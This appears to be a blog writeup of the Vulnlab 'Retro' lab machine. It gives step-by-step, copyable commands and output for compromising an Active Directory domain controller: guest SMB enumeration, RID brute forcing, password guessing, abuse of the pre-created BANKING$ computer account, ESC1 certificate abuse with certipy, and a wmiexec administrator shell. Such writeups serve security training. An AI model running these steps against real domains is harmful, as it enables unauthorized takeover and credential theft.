[Home](/) \| [Writeups](/writeups/)

# Vulnlab: Retro

Retro is a easy machine on [Vulnlab](https://www.vulnlab.com/). It involves some password guessing, provides a interesting insight into pre-created domain computer accounts and how to abuse them and ends with a ESC1 Active Directory Certificate Services abuse.

![](https://1897091482-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FwPPiA9QkeYWlDNRWWT2l%2Fretro_slide.png?alt=media&token=7fa3c610-34d9-45ab-925c-b72880dc4420)

## Nmap

As with every machine, let's start with an Nmap scan. I use my own Rust wrapper which you can find [here](https://github.com/qur1us/rustmap). Let's look at the results.

```
Nmap scan report for 10.10.106.112
Host is up (0.045s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-29 18:30:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2023-07-23T21:06:31
|_Not valid after:  2024-07-22T21:06:31
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2023-07-23T21:06:31
|_Not valid after:  2024-07-22T21:06:31
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2023-07-23T21:06:31
|_Not valid after:  2024-07-22T21:06:31
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2023-07-23T21:06:31
|_Not valid after:  2024-07-22T21:06:31
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-10-29T18:31:35+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2023-10-29T18:30:55+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2023-07-25T09:53:42
|_Not valid after:  2024-01-24T09:53:42
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
49871/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2023-10-29T18:30:57
|_  start_date: N/A
```

From the results we can see that we are probably dealing with a domain controller of the `retro.vl` domain. Let's start our enumeration with LDAP.

## LDAP

The very first thing we have to do, is to acquire a `namingContext` for us to use in later LDAP queries as a base.

```
➜  retro ldapsearch -x -H ldap://10.10.106.112 -s base namingContexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=retro,DC=vl
namingContexts: CN=Configuration,DC=retro,DC=vl
namingContexts: CN=Schema,CN=Configuration,DC=retro,DC=vl
namingContexts: DC=DomainDnsZones,DC=retro,DC=vl
namingContexts: DC=ForestDnsZones,DC=retro,DC=vl
```

With a proper  `namingContext` we can try null authentication and see if we can access the LDAP database.

```
➜  retro ldapsearch -x -H ldap://10.10.106.112 -s sub -b 'DC=retro,DC=vl'
# extended LDIF
#
# LDAPv3
# base <DC=retro,DC=vl> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090AC9, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1

```

Unfortunately, we need a valid set of credentials to interact with LDAP. Let's move on to SMB.

## SMB

Since LDAP has failed us, we can continue by enumerating SMB. The very first thing we can try is to provide blank credentials, however this time it fails. What we can do is to provide a username (any username) and a blank password for a guest session. Using `crackmapexec` we can see that it indeed works and we can list the shares.

```
➜  retro crackmapexec smb 10.10.106.112 -u 'guest' -p '' --shares
SMB         10.10.106.112      445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.112      445    DC               [+] retro.vl\guest: 
SMB         10.10.106.112      445    DC               [+] Enumerated shares
SMB         10.10.106.112      445    DC               Share           Permissions     Remark
SMB         10.10.106.112      445    DC               -----           -----------     ------
SMB         10.10.106.112      445    DC               ADMIN$                          Remote Admin
SMB         10.10.106.112      445    DC               C$                              Default share
SMB         10.10.106.112      445    DC               IPC$            READ            Remote IPC
SMB         10.10.106.112      445    DC               NETLOGON                        Logon server share 
SMB         10.10.106.112      445    DC               Notes                           
SMB         10.10.106.112      445    DC               SYSVOL                          Logon server share 
SMB         10.10.106.112      445    DC               Trainees        READ            
```

There are two shares that are not default: `Notes` and `Trainees`. However, we only have read permissions to read the Trainees share. We can use `impacket-smbclient` to use the explore the Trainees share.

```
➜  retro impacket-smbclient guest@10.10.106.112 -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# use Trainees
# ls
drw-rw-rw-          0  Mon Jul 24 00:16:11 2023 .
drw-rw-rw-          0  Wed Jul 26 11:54:14 2023 ..
-rw-rw-rw-        288  Mon Jul 24 00:16:11 2023 Important.txt
```

Inside the share there is only one text file named `Important.txt` Let's take a look at it's contents.

```
# cat important.txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

The admins apparently created one account for all trainees. Let's enumerate the account name by trying to brute force RIDs with `crackmapexec`.

```
➜  retro crackmapexec smb 10.10.106.112 -u 'guest' -p '' --rid-brute
SMB         10.10.106.112   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.112   445    DC               [+] retro.vl\guest: 
SMB         10.10.106.112   445    DC               [+] Brute forcing RIDs
.
.
.
SMB         10.10.106.112   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.10.106.112   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.10.106.112   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.106.112   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.10.106.112   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.10.106.112   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.10.106.112   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.10.106.112   445    DC               1109: RETRO\tblack (SidTypeUser)
```

We can see that there indeed exists a domain account named `trainee`. What we have to do now is to find a suitable password. We have to keep in mind the message `some of you seemed to struggle with remembering strong and unique passwords`. We can guess that this password will not be very strong and is probably easy to guess. Let's try something very basic such as username == password and if that fails we will attempt to create a wordlist.

```
➜  retro crackmapexec smb 10.10.106.112 -u 'trainee' -p 'trainee'
SMB         10.10.106.112      445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.112      445    DC               [+] retro.vl\Trainee:trainee
```

We can see that our first guess was correct and we get a successful login!

## Authenticated enumeration with user trainee

### Failing to get shell

Now that we own credentials to the `trainee` user, we have to figure out how to continue. Since there are LDAP and WINRM ports opened we can try them both.

```
➜  retro crackmapexec winrm 10.10.106.112 -u 'Trainee' -p 'trainee'
SMB         10.10.106.112      5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:retro.vl)
HTTP        10.10.106.112      5985   DC               [*] http://10.10.106.112:5985/wsman
WINRM       10.10.106.112      5985   DC               [-] retro.vl\Trainee:trainee

➜  retro crackmapexec ldap 10.10.106.112 -u 'Trainee' -p 'trainee'        
SMB         10.10.106.112      445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
LDAP        10.10.106.112      445    DC               [-] retro.vl\Trainee:trainee Error connecting to the domain, are you sure LDAP service is running on the target ?
```

Unfortunately, neither have worked. Even RDP has failed.

Let's take a look at SMB again.

### Looking at SMB again

As we can remember, there was one more non-standard share.

```
➜  retro crackmapexec smb 10.10.106.112 -u 'trainee' -p 'trainee' --shares
SMB         10.10.106.112      445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.112      445    DC               [+] retro.vl\trainee:trainee 
SMB         10.10.106.112      445    DC               [+] Enumerated shares
SMB         10.10.106.112      445    DC               Share           Permissions     Remark
SMB         10.10.106.112      445    DC               -----           -----------     ------
SMB         10.10.106.112      445    DC               ADMIN$                          Remote Admin
SMB         10.10.106.112      445    DC               C$                              Default share
SMB         10.10.106.112      445    DC               IPC$            READ            Remote IPC
SMB         10.10.106.112      445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.106.112      445    DC               Notes           READ            
SMB         10.10.106.112      445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.106.112      445    DC               Trainees        READ 
```

With the new set of credentials we gained additional read permissions to some shares. Let's use `impacket-smbclient` again.

```
➜  retro impacket-smbclient trainee:trainee@10.10.106.112
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# use Notes
# ls
drw-rw-rw-          0  Mon Jul 24 00:03:16 2023 .
drw-rw-rw-          0  Wed Jul 26 11:54:14 2023 ..
-rw-rw-rw-        248  Mon Jul 24 00:05:56 2023 ToDo.txt
```

We have found another note. Let's take a look.

```
# cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

## Pre-created computer account

After doing some research on pre-created computer accounts I found a great [blog post](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts) by `TrustedSec` explaining how to abuse pre-created computer accounts.

### Looking for pre-created computer account

From both the message and blog post it's clear that we are looking for a specific computer account with appropriate attributes set. We can use `crackmapexec` with the `--rid-brute` flag again.

```
➜  retro crackmapexec smb 10.10.106.112 -u 'trainee' -p 'trainee' --rid-brute
SMB         10.10.106.112   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.112   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.10.106.112   445    DC               [+] Brute forcing RIDs
.
.
.
SMB         10.10.106.112   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.10.106.112   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.10.106.112   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.106.112   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.10.106.112   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.10.106.112   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.10.106.112   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.10.106.112   445    DC               1109: RETRO\tblack (SidTypeUser)
```

This looks promising. We have found two domain computer accounts. One is `DC$` and the second is `BANKING$`. As the article mentioned above suggests, pre-created computer accounts with the `Assign this computer account as a pre-Windows 2000 computer` checkmark, would have the password for the computer account the same as the computer account name in lowercase. So if all attributes are set correctly, we should be able to authenticate as the `BANKING$` computer account using `banking` as the password.

Let's check with `crackmapexec`.

```
➜  retro crackmapexec smb 10.10.106.112 -u 'BANKING$' -p 'banking'    
SMB         10.10.106.112   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.112   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
➜  retro crackmapexec smb 10.10.106.112 -u 'BANKING$' -p 'bankings'
SMB         10.10.106.112   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.112   445    DC               [-] retro.vl\BANKING$:bankings STATUS_LOGON_FAILURE
```

As we can see the we were able to successfully authenticate as the `BANKING$` computer account. We can confirm that by using a wrong password and observe the different messages that are provided. In case of successful authentication we get `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` instead of `STATUS_LOGON_FAILURE`.

This is expected as we have to change the account password as the article suggests.

### Changing the password

To change the password we can use `impacket-changepasswd` script. The article also mentions using RPC over SMB as it results in errors. We can do so with the `-p rpc-samr` flag.

```
➜  retro impacket-changepasswd 'retro.vl/BANKING$':banking@10.10.106.112 -newpass Password123456 -dc-ip 10.10.106.112 -p rpc-samr
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```

And we can confirm that we indeed have changed the `BANKING$` account password.

```
➜  retro crackmapexec smb 10.10.106.112 -u 'BANKING$' -p 'Password123456'         
SMB         10.10.106.112   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.112   445    DC               [+] retro.vl\BANKING$:Password123456
```

## AD CS

### Checking if AD CS is present

What we can do next is to check whether the `retro.vl` uses Active Directory Certificate Services. We can check with `certipy`.

```
➜  retro certipy find -u 'BANKING$'@retro.vl -p Password123456 -dc-ip 10.10.106.112 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
[*] Got CA configuration for 'retro-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
```


We can see that the `retro.vl` domain indeed uses Active Directory Certificate Services and we may proceed with enumeration of the certificate templates.

### Looking for a vulnerable template

Let's use `certipy` again with the `-vulnerable` switch to list vulnerable certificate templates. I use `-stdout` flag as well to print the output to standart output since the default output format of `certipy` is a text file and ZIP file.

Let's tak a look if we can find some vulnerable templates that would allow us to elevate our privileges in the domain.

```
➜  retro certipy find -vulnerable -u 'BANKING$'@retro.vl -p Password123456 -dc-ip 10.10.106.112 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
[*] Got CA configuration for 'retro-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Property Principals       : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

### ESC1 

As we can see `certipy` has flagged one template vulnerable to ESC1. `RetroClients` certificate template is used for the client authentication, however only domain/enterprise admins and domain computers can enroll to use this template. Fortunately, we already own one computer account - `BANKING$`.

ESC1 allows us to request a certificate and supply the subject SPN. This is due to the `EnrolleeSuppliesSubject` flag set. We can use `certipy` again and request a administrator certificate.

```
➜  retro certipy req -u 'BANKING$'@retro.vl -p Password123456 -dc-ip 10.10.106.112 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl               
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
[*] Request ID is 16
```

Unfortunately, this has failed with the `CERTSRV_E_KEY_LENGTH` which means that the public key does not meet the minimum size required by the specified certificate template. Taking a look back at the `certipy` output we can see that the `RetroClients` certificate template requires minimum RSA key length of 4096 Bytes.

Fortunately, `certipy` allows us to set the RSA key length with the `-key-size` flag.

```
➜  retro certipy req -u 'BANKING$'@retro.vl -p Password123456 -dc-ip 10.10.106.112 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 17
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

We can see that this indeed work and we can now use `auth` module of `certipy` to get a valid TGT as administrator.

```
➜  retro certipy auth -pfx administrator.pfx -dc-ip 10.10.106.112                                                                       
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': *******************************:*******************************
```

We now own a administrator certificate which we can use to authenticate to the domain controller.

### Getting shell

Getting shell from this point is a piece of cake. We can use `impacket-wmiexec` to get a semi-interactive shell and execute commands on the domain controller as administrator.

```
➜  retro KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass -dc-ip 10.10.106.112 retro.vl/administrator@dc.retro.vl
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
retro\administrator
```

From here we can read the root flag :)

## Final thoughts

I really enjoyed this box. What I did not know prior to this machine was the potential hidden in the pre-created computer accounts. Now I have one more thing to try on my real life engagements. Thanks [rOBIT](https://twitter.com/0xr0BIT) for creating this very nice machine!

I really hope you liked my writeup I’ll see you in the next one. Cheers!